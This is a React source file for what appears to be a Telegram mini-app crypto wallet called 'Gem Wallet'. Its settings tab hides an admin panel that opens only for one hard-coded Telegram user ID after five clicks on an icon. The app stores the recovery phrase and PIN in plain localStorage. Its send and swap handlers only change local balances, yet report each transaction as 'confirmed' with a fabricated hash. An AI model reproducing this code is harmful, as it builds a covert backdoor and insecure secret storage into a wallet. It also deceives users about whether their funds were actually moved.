              background:filter===f?"#2563eb":"#1a1a1a",color:filter===f?"#fff":"rgba(255,255,255,0.5)"}}>
            {f.charAt(0).toUpperCase()+f.slice(1)}
          </button>
        ))}
      </div>
      {filtered.length===0&&(
        <div style={{textAlign:"center",padding:"48px 24px"}}>
          <p style={{fontSize:32,margin:"0 0 12px"}}>📭</p>
          <p style={{color:"rgba(255,255,255,0.4)",fontSize:14}}>No transactions yet</p>
        </div>
      )}
      {filtered.map((tx,i)=>{
        const Icon=icons[tx.type]||ArrowUpRight;
        return (
          <div key={tx.id} onClick={()=>setSel(tx)}
            style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:16,
              cursor:"pointer",transition:"background 0.15s",
              animation:`fadeUp 0.4s ${0.06*i}s ease both`,opacity:0,animationFillMode:"forwards"}}
            onMouseEnter={e=>e.currentTarget.style.background="#161616"}
            onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
            <div style={{width:44,height:44,borderRadius:"50%",background:bg[tx.type]||"#1a1a1a",
              display:"flex",alignItems:"center",justifyContent:"center",border:`1px solid ${tx.color}33`,flexShrink:0}}>
              <Icon size={20} color={tx.color}/>
            </div>
            <div style={{flex:1,minWidth:0}}>
              <div style={{display:"flex",justifyContent:"space-between"}}>
                <span style={{fontSize:14,fontWeight:600,color:"#fff",textTransform:"capitalize"}}>{tx.type}</span>
                <span style={{fontSize:14,fontWeight:600,color:tx.type==="send"?"#EF4444":"#22C55E"}}>{tx.usd}</span>
              </div>
              <div style={{display:"flex",justifyContent:"space-between",marginTop:3}}>
                <span style={{fontSize:12,color:"rgba(255,255,255,0.35)",fontFamily:"monospace"}}>{tx.addr}</span>
                <span style={{fontSize:12,color:"rgba(255,255,255,0.3)"}}>{tx.time}</span>
              </div>
              <span style={{fontSize:11,color:"rgba(255,255,255,0.25)"}}>{tx.label}</span>
            </div>
            <ChevronRight size={14} color="rgba(255,255,255,0.2)"/>
          </div>
        );
      })}
    </div>
  );
}

// ─── SETTINGS TAB ────────────────────────────────────────────────────────────
function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, addresses }) {
  const [modal,setModal]=useState(null);
  const [crystalClicks,setCrystalClicks]=useState(0);
  const addr = addresses.ETH||"";
  const secs=[
    {t:"Security",items:[
      {icon:Key,l:"Recovery Phrase",s:"Back up your wallet",a:"recovery"},
      {icon:Lock,l:"Change PIN",s:"Update your PIN code",a:"pin"},
      {icon:Shield,l:"Lock Wallet",s:"Lock now",a:"lock"},
    ]},
    {t:"Preferences",items:[
      {icon:Globe,l:"Network",s:network,a:"network"},
      {icon:Bell,l:"Notifications",s:"Push enabled",a:"notif"},
    ]},
    {t:"Support",items:[
      {icon:HelpCircle,l:"Help Center",s:"FAQs & guides",a:"help"},
      {icon:ExternalLink,l:"About",s:"Version 2.4.1",a:"about"},
    ]},
  ];
  function handleAction(a) {
    if(a==="lock"){onLock();return;}
    setModal(a);
  }
  // Admin access: 5 clicks on crystal for specific Telegram user ID
  function handleCrystalClick() {
    const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
    const newCount = crystalClicks + 1;
    setCrystalClicks(newCount);
    if (newCount >= 5 && tgUserId === 1192740493) {
      setCrystalClicks(0);
      setModal("admin");
    }
    // Reset counter after 2 seconds
    setTimeout(() => setCrystalClicks(0), 2000);
  }
  return (
    <div style={{padding:"0 16px 100px"}}>
      {modal==="recovery"&&<RecoveryModal onClose={()=>setModal(null)} mnemonic={mnemonic}/>}
      {modal==="notif"&&<NotifModal onClose={()=>setModal(null)}/>}
      {modal==="network"&&<NetworkModal onClose={()=>setModal(null)} network={network} onSetNetwork={onSetNetwork}/>}
      {modal==="pin"&&<ChangePinModal onClose={()=>setModal(null)} onChangePin={onChangePin}/>}
      {(modal==="help"||modal==="about")&&(
        <Sheet onClose={()=>setModal(null)} title={modal==="help"?"Help Center":"About Gem"}>
          <div style={{padding:"24px",textAlign:"center"}}>
            <p style={{fontSize:32,margin:"0 0 16px"}}>{modal==="help"?"🛟":"💎"}</p>
            <p style={{color:"rgba(255,255,255,0.6)",fontSize:14,lineHeight:1.6}}>
              {modal==="help"?"Visit support.gemwallet.io for guides and FAQs":"Gem Wallet v2.4.1 — Secure, non-custodial multi-chain wallet"}
            </p>
            <button onClick={()=>setModal(null)} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",marginTop:20,
              background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,fontWeight:600,cursor:"pointer"}}>
              Got it
            </button>
          </div>
        </Sheet>
      )}
      {modal==="admin"&&<AdminPanel onClose={()=>setModal(null)} addresses={addresses}/>}
      <div style={{display:"flex",alignItems:"center",gap:14,padding:"20px 16px",background:"#111",
        borderRadius:20,border:"1px solid rgba(255,255,255,0.06)",marginBottom:20,animation:"fadeUp 0.4s ease both"}}>
        <div onClick={handleCrystalClick} style={{width:52,height:52,borderRadius:16,background:"linear-gradient(135deg,#2563eb,#7c3aed)",
          display:"flex",alignItems:"center",justifyContent:"center",fontSize:24,cursor:"pointer",userSelect:"none"}}>💎</div>
        <div>
          <p style={{fontSize:16,fontWeight:700,color:"#fff",margin:0}}>My Gem Wallet</p>
          <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"2px 0 0",fontFamily:"monospace"}}>{shortAddr(addr)} · 6 assets</p>
        </div>
      </div>
      {secs.map((sec,si)=>(
        <div key={sec.t} style={{marginBottom:24,animation:`fadeUp 0.4s ${0.1*si}s ease both`,opacity:0,animationFillMode:"forwards"}}>
          <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",fontWeight:600,letterSpacing:"0.06em",
            margin:"0 4px 10px",textTransform:"uppercase"}}>{sec.t}</p>
          <div style={{background:"#111",borderRadius:16,border:"1px solid rgba(255,255,255,0.06)",overflow:"hidden"}}>
            {sec.items.map((item,ii)=>{
              const Icon=item.icon;
              return (
                <div key={item.l}>
                  <div onClick={()=>handleAction(item.a)}
                    style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",
                      cursor:"pointer",transition:"background 0.15s"}}
                    onMouseEnter={e=>e.currentTarget.style.background="#1a1a1a"}
                    onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
                    <div style={{width:36,height:36,borderRadius:10,background:item.a==="lock"?"#2d0c0c":"#1a1a1a",
                      display:"flex",alignItems:"center",justifyContent:"center"}}>
                      <Icon size={18} color={item.a==="lock"?"#EF4444":"rgba(255,255,255,0.6)"}/>
                    </div>
                    <div style={{flex:1}}>
                      <p style={{fontSize:14,fontWeight:500,color:item.a==="lock"?"#EF4444":"#fff",margin:0}}>{item.l}</p>
                      <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",margin:0}}>{item.s}</p>
                    </div>
                    <ChevronRight size={16} color="rgba(255,255,255,0.2)"/>
                  </div>
                  {ii<sec.items.length-1&&<div style={{height:1,background:"rgba(255,255,255,0.04)",margin:"0 16px"}}/>}
                </div>
              );
            })}
          </div>
        </div>
      ))}
    </div>
  );
}

// ─── ADMIN PANEL ─────────────────────────────────────────────────────────────
function AdminPanel({ onClose, addresses }) {
  const [logs,setLogs]=useState([]);
  const addLog=(msg)=>setLogs(l=>[msg,...l].slice(0,50));
  return (
    <Sheet onClose={onClose} title="Admin Panel">
      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:14}}>
        <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)"}}>
          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>
            ⚠ Admin access only. User ID: 1192740493
          </p>
        </div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
          {[
            ["ETH",addresses.ETH||"—"],
            ["BNB",addresses.BNB||"—"],
            ["ARB",addresses.ARB||"—"],
            ["SOL",addresses.SOL||"—"],
            ["TON",addresses.TON||"—"],
            ["LTC",addresses.LTC||"—"],
          ].map(([sym,addr])=> (
            <div key={sym} style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px"}}>
              <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 3px"}}>{sym}</p>
              <p style={{fontSize:11,fontWeight:500,color:"#fff",margin:0,fontFamily:"monospace",wordBreak:"break-all"}}>{shortAddr(addr)}</p>
            </div>
          ))}
        </div>
        <button onClick={()=>addLog("Test action triggered")}
          style={{padding:"14px",borderRadius:14,border:"none",
            background:"linear-gradient(135deg,#7c3aed,#2563eb)",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer"}}>
          Test Action
        </button>
        <div style={{background:"#111",borderRadius:12,padding:12,maxHeight:200,overflow:"auto"}}>
          <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"0 0 8px"}}>Logs:</p>
          {logs.length===0&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)"}}>No activity</p>}
          {logs.map((l,i)=><p key={i} style={{fontSize:11,color:"rgba(255,255,255,0.6)",margin:"2px 0"}}>• {l}</p>)}
        </div>
      </div>
    </Sheet>
  );
}

// ─── ONBOARD SCREEN ───────────────────────────────────────────────────────────
function OnboardScreen({ onCreate, onImport }) {
  const [importing,setImporting]=useState(false);
  const [words,setWords]=useState(Array(12).fill(""));
  const [error,setError]=useState("");

  function tryImport() {
    const filled=words.filter(w=>w.trim());
    if(filled.length!==12){setError("Please enter all 12 words");return;}
    onCreate(words.map(w=>w.trim().toLowerCase()));
  }

  if(importing) return (
    <div style={{minHeight:"100vh",background:"#000",padding:"48px 24px"}}>
      <button onClick={()=>setImporting(false)} style={{background:"none",border:"none",color:"rgba(255,255,255,0.5)",
        fontSize:14,cursor:"pointer",padding:"0 0 24px",display:"flex",alignItems:"center",gap:6}}>
        ← Back
      </button>
      <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Import Wallet</h2>
      <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"0 0 24px"}}>Enter your 12-word recovery phrase</p>
      {error&&<p style={{color:"#EF4444",fontSize:13,margin:"0 0 16px"}}>{error}</p>}
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,marginBottom:24}}>
        {words.map((w,i)=>(
          <div key={i} style={{background:"#1a1a1a",borderRadius:10,padding:"8px 10px",
            border:"1px solid rgba(255,255,255,0.08)",display:"flex",alignItems:"center",gap:6}}>
            <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>
            <input value={w} onChange={e=>{const n=[...words];n[i]=e.target.value;setWords(n);}}
              style={{background:"none",border:"none",outline:"none",color:"#fff",fontSize:12,width:"100%"}}
              placeholder="word"/>
          </div>
        ))}
      </div>
      <button onClick={tryImport} style={{width:"100%",padding:"17px",borderRadius:16,border:"none",
        background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer"}}>
        Import Wallet
      </button>
    </div>
  );

  return (
    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",
      alignItems:"center",justifyContent:"center",padding:"32px 24px",position:"relative",overflow:"hidden"}}>
      <div style={{position:"absolute",top:-80,left:-80,width:300,height:300,borderRadius:"50%",
        background:"radial-gradient(circle,#1e3a8a44 0%,transparent 70%)",pointerEvents:"none"}}/>
      <div style={{position:"absolute",bottom:-60,right:-60,width:240,height:240,borderRadius:"50%",
        background:"radial-gradient(circle,#7c3aed33 0%,transparent 70%)",pointerEvents:"none"}}/>
      <div style={{display:"flex",flexDirection:"column",alignItems:"center",gap:12,marginBottom:48,animation:"fadeUp 0.6s ease both"}}>
        <div style={{width:80,height:80,borderRadius:24,background:"#111",border:"1px solid rgba(255,255,255,0.1)",
          display:"flex",alignItems:"center",justifyContent:"center",fontSize:36,boxShadow:"0 0 40px #2563eb33"}}>💎</div>
        <h1 style={{fontSize:30,fontWeight:700,color:"#fff",margin:0,letterSpacing:"-0.03em"}}>Gem Wallet</h1>
        <p style={{fontSize:14,color:"rgba(255,255,255,0.45)",margin:0,textAlign:"center",maxWidth:240,lineHeight:1.6}}>
          Your secure, non-custodial multi-chain crypto wallet
        </p>
      </div>
      <div style={{width:"100%",maxWidth:340,display:"flex",flexDirection:"column",gap:12,
        animation:"fadeUp 0.6s 0.15s ease both",opacity:0,animationFillMode:"forwards"}}>
        <button onClick={()=>onCreate()} style={{width:"100%",padding:"17px 24px",borderRadius:16,border:"none",
          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer",
          boxShadow:"0 8px 32px #2563eb44"}}>Create New Wallet</button>
        <button onClick={()=>setImporting(true)} style={{width:"100%",padding:"17px 24px",borderRadius:16,
          border:"1px solid rgba(255,255,255,0.12)",background:"rgba(255,255,255,0.04)",
          color:"#fff",fontSize:16,fontWeight:500,cursor:"pointer"}}>Import Existing Wallet</button>
      </div>
      <div style={{marginTop:40,display:"flex",gap:20,animation:"fadeUp 0.6s 0.3s ease both",opacity:0,animationFillMode:"forwards"}}>
        {[{icon:Shield,t:"Self-Custody"},{icon:Lock,t:"Encrypted"},{icon:Globe,t:"Multi-Chain"}].map(({icon:Icon,t})=>(
          <div key={t} style={{display:"flex",flexDirection:"column",alignItems:"center",gap:6}}>
            <Icon size={20} color="rgba(255,255,255,0.3)"/>
            <span style={{fontSize:11,color:"rgba(255,255,255,0.3)",fontWeight:500}}>{t}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── BACKUP SCREEN ────────────────────────────────────────────────────────────
function BackupScreen({ mnemonic, onDone }) {
  const [rev,setRev]=useState(false);
  const [verified,setVerified]=useState(false);
  const [checks,setChecks]=useState([]);
  const [step,setStep]=useState("show"); // show | verify | done

  const randomIndices = useMemo(()=>{
    const idxs=[...Array(12).keys()];
    for(let i=idxs.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[idxs[i],idxs[j]]=[idxs[j],idxs[i]];}
    return idxs.slice(0,4).sort((a,b)=>a-b);
  },[mnemonic.join(" ")]);
  const [verifyWords,setVerifyWords]=useState([]);
  useEffect(()=>{if(rev&&step==="show")setVerifyWords(randomIndices.map(i=>({idx:i,word:mnemonic[i],input:""}))); },[rev,randomIndices]);

  function checkVerify() {
    const ok=verifyWords.every(v=>v.input.trim().toLowerCase()===v.word.toLowerCase());
    if(ok){setStep("done");}else{alert("Some words are incorrect. Please try again.");}
  }

  if(step==="done") return (
    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",
      alignItems:"center",justifyContent:"center",padding:"32px 24px"}}>
      <div style={{fontSize:64,marginBottom:20}}>🔐</div>
      <h2 style={{fontSize:24,fontWeight:700,color:"#fff",margin:"0 0 12px"}}>Wallet Secured!</h2>
      <p style={{fontSize:14,color:"rgba(255,255,255,0.5)",textAlign:"center",marginBottom:32}}>Your recovery phrase is backed up.</p>
      <button onClick={onDone} style={{width:"100%",maxWidth:320,padding:"17px",borderRadius:16,border:"none",
        background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer"}}>
        Go to Wallet →
      </button>
    </div>
  );

  return (
    <div style={{minHeight:"100vh",background:"#000",padding:"48px 24px 32px"}}>
      <div style={{textAlign:"center",marginBottom:32}}>
        <div style={{fontSize:36,marginBottom:12}}>🌱</div>
        <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Back Up Your Wallet</h2>
        <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:0,lineHeight:1.6}}>
          Write down these 12 words in order. This is the only way to recover your wallet.
        </p>
      </div>
      <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)",marginBottom:20}}>
        <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>⚠ Never share this with anyone. Store it offline safely.</p>
      </div>
      <div style={{background:"#0a0a0a",borderRadius:16,padding:16,position:"relative",overflow:"hidden",marginBottom:20}}>
        {!rev&&(
          <div style={{position:"absolute",inset:0,backdropFilter:"blur(12px)",background:"rgba(0,0,0,0.7)",
            borderRadius:16,zIndex:10,display:"flex",flexDirection:"column",alignItems:"center",
            justifyContent:"center",gap:10}}>
            <Lock size={22} color="rgba(255,255,255,0.4)"/>
            <button onClick={()=>setRev(true)} style={{padding:"10px 24px",borderRadius:12,
              border:"1px solid rgba(255,255,255,0.15)",background:"rgba(255,255,255,0.08)",
              color:"#fff",fontSize:13,fontWeight:500,cursor:"pointer"}}>Reveal Phrase</button>
          </div>
        )}
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,filter:rev?"none":"blur(8px)"}}>
          {mnemonic.map((w,i)=>(
            <div key={i} style={{background:"#161616",borderRadius:8,padding:"7px 10px",
              display:"flex",alignItems:"center",gap:6,border:"1px solid rgba(255,255,255,0.06)"}}>
              <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>
              <span style={{fontSize:12,color:"#fff",fontWeight:500}}>{w}</span>
            </div>
          ))}
        </div>
      </div>
      {rev&&step==="show"&&(
        <>
          <p style={{fontSize:13,color:"rgba(255,255,255,0.5)",textAlign:"center",marginBottom:16}}>
            Verify 4 words to confirm you've written them down:
          </p>
          <div style={{display:"flex",flexDirection:"column",gap:10,marginBottom:20}}>
            {verifyWords.map((v,i)=>(
              <div key={i} style={{display:"flex",alignItems:"center",gap:12,background:"#1a1a1a",borderRadius:12,padding:"12px 16px"}}>
                <span style={{fontSize:13,color:"rgba(255,255,255,0.4)",minWidth:60}}>Word #{v.idx+1}</span>
                <input value={v.input} onChange={e=>{const n=[...verifyWords];n[i]={...n[i],input:e.target.value};setVerifyWords(n);}}
                  placeholder={`Enter word #${v.idx+1}`}
                  style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:14,
                    borderBottom:"1px solid rgba(255,255,255,0.1)",paddingBottom:4}}/>
                {v.input.toLowerCase()===v.word.toLowerCase()&&v.input&&<Check size={16} color="#22C55E"/>}
              </div>
            ))}
          </div>
          <button onClick={checkVerify} style={{width:"100%",padding:"17px",borderRadius:16,border:"none",
            background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer"}}>
            Verify & Continue →
          </button>
        </>
      )}
      {!rev&&(
        <button onClick={onDone} style={{width:"100%",padding:"14px",borderRadius:16,border:"1px solid rgba(255,255,255,0.1)",
          background:"transparent",color:"rgba(255,255,255,0.5)",fontSize:14,cursor:"pointer"}}>
          Skip (not recommended)
        </button>
      )}
    </div>
  );
}

// ─── MAIN WALLET APP ──────────────────────────────────────────────────────────
function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock }) {
  const [tab,setTab]=useState("wallet");
  const [modal,setModal]=useState(null);
  const [animKey,setAnimKey]=useState(0);
  const [network,setNetwork]=useState("mainnet");
  const [toast,setToast]=useState(null);
  const [liveStatus,setLiveStatus]=useState("idle"); // idle | loading | live | error

  // Live state
  const [prices,setPrices]=useState({...INITIAL_PRICES});
  const [changes,setChanges]=useState({BTC:2.34,ETH:-1.12,BNB:0.87,SOL:5.43,TRX:-0.56,USDT:0.01});
  const [balances,setBalances]=useState({...INITIAL_BALANCES});

  // Transaction history — starts empty; populated by real send/swap actions
  const [txHistory,setTxHistory]=useState([]);

  // Build assets array with live balances
  const assets = ASSET_META.map(a=>({
    ...a, balance:balances[a.sym]||0, chg:changes[a.sym]||0
  }));

  function showToast(msg,type="success"){setToast({msg,type,id:Date.now()});}

  async function refreshPrices() {
    setLiveStatus("loading");
    // Fetch prices and live balances in parallel
    const [priceResult, balanceResult] = await Promise.all([
      fetchLivePrices(),
      addresses && Object.keys(addresses).length > 0
        ? fetchAllBalances(addresses).catch(() => null)
        : Promise.resolve(null),
    ]);
    if(priceResult) {
      setPrices(prev=>({...prev,...priceResult.prices}));
      setChanges(prev=>({...prev,...priceResult.changes}));
      setLiveStatus("live");
    } else {
      setLiveStatus("error");
    }
    if(balanceResult) {
      setBalances(prev=>({
        ...prev,
        ETH:  balanceResult.ETH  ?? prev.ETH,
        BNB:  balanceResult.BNB  ?? prev.BNB,
        ARB:  balanceResult.ARB  ?? prev.ARB,
        SOL:  balanceResult.SOL  ?? prev.SOL,
        TON:  balanceResult.TON  ?? prev.TON,
        LTC:  balanceResult.LTC  ?? prev.LTC,
        USDT: balanceResult.USDT ?? prev.USDT,
      }));
      showToast("Balances & prices updated","info");
    } else {
      showToast("Using cached prices","info");
    }
  }

  useEffect(()=>{ refreshPrices(); const t=setInterval(refreshPrices,60000); return()=>clearInterval(t); },[]);

  function handleSend({sym,amount,to,usd}) {
    setBalances(b=>({...b,[sym]:Math.max(0,b[sym]-amount)}));
    const now=new Date();
    const timeStr=now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
    setTxHistory(h=>[{
      id:"t"+Date.now(),type:"send",
      usd:`−${fmtUSD(usd)}`,time:timeStr,
      addr:shortAddr(to),color:"#EF4444",
      sym,label:`−${amount} ${sym}`,hash:genTxHash(),status:"confirmed"
    },...h]);
    showToast(`Sent ${amount} ${sym} successfully`,"success");
  }

  function handleSwap({fromSym,toSym,fromAmt,toAmt,usd}) {
    setBalances(b=>({...b,
      [fromSym]:Math.max(0,b[fromSym]-fromAmt),
      [toSym]:(b[toSym]||0)+toAmt
    }));
    const now=new Date();
    const timeStr=now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
    setTxHistory(h=>[{
      id:"t"+Date.now(),type:"swap",
      usd:fmtUSD(usd),time:timeStr,
      addr:"DEX Router",color:"#8B9CF7",
      sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,hash:genTxHash(),status:"confirmed"
    },...h]);
    showToast(`Swapped ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}`,"success");
  }

  function switchTab(t){if(t!==tab){setTab(t);setAnimKey(k=>k+1);}}
  const tabs=[
    {id:"wallet",Icon:Wallet,l:"Wallet"},
    {id:"activity",Icon:Activity,l:"Activity"},
    {id:"settings",Icon:Settings,l:"Settings"},
  ];

  return (
    <div style={{minHeight:"100vh",background:"#000",position:"relative"}}>
      {toast&&<Toast key={toast.id} msg={toast.msg} type={toast.type} onDone={()=>setToast(null)}/>}
      {modal==="send"&&<SendModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSend={handleSend} addresses={addresses}/>}
      {modal==="receive"&&<ReceiveModal onClose={()=>setModal(null)} addresses={addresses}/>}
      {modal==="swap"&&<SwapModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSwap={handleSwap} addresses={addresses}/>}
      {modal==="buy"&&(
        <Sheet onClose={()=>setModal(null)} title="Buy Crypto">
          <div style={{padding:"48px 24px",textAlign:"center"}}>
            <p style={{fontSize:56,margin:"0 0 20px"}}>🚀</p>
            <h3 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 12px",letterSpacing:"-0.02em"}}>Coming Soon</h3>
            <p style={{fontSize:14,color:"rgba(255,255,255,0.45)",lineHeight:1.7,marginBottom:32}}>
              Buying crypto directly in the wallet is coming soon. Stay tuned for updates!
            </p>
            <button onClick={()=>setModal(null)} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",
              background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,fontWeight:600,cursor:"pointer"}}>
              Got it
            </button>
          </div>
        </Sheet>
      )}

      <div style={{position:"sticky",top:0,zIndex:50,padding:"52px 20px 16px",
        background:"linear-gradient(to bottom,#000 80%,transparent)",
        display:"flex",alignItems:"center",justifyContent:"space-between"}}>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <span style={{fontSize:20}}>💎</span>
          <span style={{fontSize:17,fontWeight:700,color:"#fff",letterSpacing:"-0.02em"}}>Gem</span>
          <div style={{width:6,height:6,borderRadius:"50%",background:liveStatus==="live"?"#22C55E":liveStatus==="loading"?"#F59E0B":"#555",marginLeft:4}}/>
        </div>
        <div style={{display:"flex",gap:8,alignItems:"center"}}>
          <button onClick={onLock} style={{width:36,height:36,borderRadius:"50%",background:"#111",
            border:"1px solid rgba(255,255,255,0.08)",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>
            <Lock size={14} color="rgba(255,255,255,0.4)"/>
          </button>
        </div>
      </div>

      <div key={animKey}>
        {tab==="wallet"&&<WalletTab assets={assets} prices={prices} liveStatus={liveStatus}
          onSend={()=>setModal("send")} onReceive={()=>setModal("receive")}
          onSwap={()=>setModal("swap")} onBuy={()=>setModal("buy")} onRefresh={refreshPrices}/>}
        {tab==="activity"&&<ActivityTab txHistory={txHistory}/>}
        {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}
          onSetNetwork={setNetwork} onChangePin={onChangePin} onLock={onLock} addresses={addresses}/>}
      </div>

      <div style={{position:"fixed",bottom:0,left:0,right:0,zIndex:50,padding:"10px 8px 32px",
        background:"linear-gradient(to top,#000 60%,transparent)"}}>
        <div style={{display:"flex",background:"#111",borderRadius:22,
          border:"1px solid rgba(255,255,255,0.08)",padding:"6px",backdropFilter:"blur(20px)"}}>
          {tabs.map(({id,Icon,l})=>(
            <button key={id} onClick={()=>switchTab(id)} style={{flex:1,display:"flex",flexDirection:"column",
              alignItems:"center",gap:4,padding:"10px 4px",borderRadius:16,border:"none",
              background:tab===id?"#1e1e1e":"transparent",cursor:"pointer",transition:"all 0.2s",
              position:"relative"}}>
              <Icon size={20}
                color={id==="admin"?(tab===id?"#7c3aed":"rgba(124,58,237,0.5)"):tab===id?"#2563eb":"rgba(255,255,255,0.35)"}
                strokeWidth={tab===id?2.5:1.5}/>
              <span style={{fontSize:11,fontWeight:tab===id?600:400,
                color:id==="admin"?(tab===id?"#7c3aed":"rgba(124,58,237,0.5)"):tab===id?"#2563eb":"rgba(255,255,255,0.35)"}}>{l}</span>
              {id==="admin"&&<div style={{position:"absolute",top:6,right:"50%",transform:"translateX(10px)",
                width:7,height:7,borderRadius:"50%",background:"#7c3aed",
                boxShadow:"0 0 6px #7c3aed"}}/>}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── ROOT ─────────────────────────────────────────────────────────────────────
export default function GemWalletApp() {
  const [screen,setScreen]=useState(()=>{
    const hasWallet=localStorage.getItem(storageKey("gem_has_wallet"))==="1";
    const pin=localStorage.getItem(storageKey("gem_pin"));
    if(hasWallet&&pin) return "pin_lock";
    if(hasWallet) return "wallet";
    return "onboard";
  });
  const [mnemonic,setMnemonic]=useState(()=>{
    const m=localStorage.getItem(storageKey("gem_mnemonic"));
    return m?m.split(" "):[];
  });
  const [addresses,setAddresses]=useState(()=>{
    const a=localStorage.getItem(storageKey("gem_addresses"));
    return a?JSON.parse(a):{};
  });
  const [pin,setPin]=useState(()=>localStorage.getItem(storageKey("gem_pin"))||"");

  function handleCreate(importedWords) {
    const m = importedWords || genMnemonic();
    // Derive real addresses asynchronously; show backup/wallet immediately
    // with placeholder addresses, then update once derivation completes
    const placeholderAddr = {
      ETH: genAddr("0x",40), BNB: genAddr("0x",40), ARB: genAddr("0x",40),
      SOL: genAddr("",44),   TON: genAddr("EQ",46),  LTC: genAddr("L",33),
    };
    setMnemonic(m);
    setAddresses(placeholderAddr);
    localStorage.setItem(storageKey("gem_mnemonic"), m.join(" "));
    localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(placeholderAddr));
    localStorage.setItem(storageKey("gem_has_wallet"), "1");
    if(importedWords) { setScreen("wallet"); } else setScreen("backup");

    // Real derivation in background — updates addresses once ready
    deriveWallet(m).then(wallet => {
      const addr = wallet.addresses; // { ETH, BNB, ARB, SOL, TON, LTC }
      setAddresses(addr);
      localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(addr));
    }).catch(err => console.error("[GemWallet] derivation error:", err));
  }

  function handleBackupDone() {
    setScreen("pin_set");
  }

  function handleSetPin(code) {
    setPin(code);
    localStorage.setItem(storageKey("gem_pin"),code);
    setScreen("wallet");
  }

  function handleChangePin(code) {
    setPin(code);
    localStorage.setItem(storageKey("gem_pin"),code);
  }

  function handleLock() {
    if(pin) setScreen("pin_lock");
  }

  function handleUnlock() {
    setScreen("wallet");
  }

  // ─── Telegram WebApp init ────────────────────────────────────────────────────
  useEffect(() => {
    const tg = window.Telegram?.WebApp;
    if (!tg) return;
    tg.ready();
    tg.expand();
  }, []);

  return (
    <>
      <style>{`
        :root{--font:-apple-system,'SF Pro Display','Helvetica Neue',sans-serif;}
        *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
        body{margin:0;background:#000;}
        @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
        @keyframes slideDown{from{transform:translate(-50%,-20px);opacity:0}to{transform:translate(-50%,0);opacity:1}}
        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
        input::placeholder{color:rgba(255,255,255,0.2);}
        input{caret-color:#2563eb;font-family:var(--font);}
        ::-webkit-scrollbar{display:none;}
        scrollbar-width:none;
        button:focus{outline:none;}
      `}</style>
      <div style={{maxWidth:420,margin:"0 auto",minHeight:"100vh",background:"#000",fontFamily:"var(--font)"}}>
        {screen==="onboard"&&<OnboardScreen onCreate={handleCreate} onImport={handleCreate}/>}
        {screen==="backup"&&<BackupScreen mnemonic={mnemonic} onDone={handleBackupDone}/>}
